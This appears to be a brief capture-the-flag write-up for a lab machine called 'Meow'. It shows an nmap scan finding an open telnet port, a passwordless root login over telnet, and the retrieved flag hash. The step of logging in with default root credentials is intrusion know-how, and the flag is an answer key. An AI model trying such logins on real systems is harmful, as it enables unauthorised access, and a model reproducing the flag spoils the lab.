![Pasted image 20220206173147.png]

#telnet

Very Easy. Telnet was open (as determined by nmap scan). Connected as the default telent user (root) and no password was required. Ran dir, cat'd out results, there's the flag.

```
┌──(ghohst㉿kali)-[~/Documents]
└─$ cat scan.txt              
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-06 17:25 MST
Nmap scan report for 10.129.132.30
Host is up (0.091s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
┌──(ghohst㉿kali)-[~/Documents]
└─$ telnet 10.129.132.30 23
Trying 10.129.132.30...
Connected to 10.129.132.30.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█

Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 07 Feb 2022 12:29:30 AM UTC

  System load:           0.01
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             138
  Users logged in:       0
  IPv4 address for eth0: 10.129.132.30
  IPv6 address for eth0: dead:beef::250:56ff:feb9:59ae

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~# dir
flag.txt  snap
root@Meow:~# cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19
```
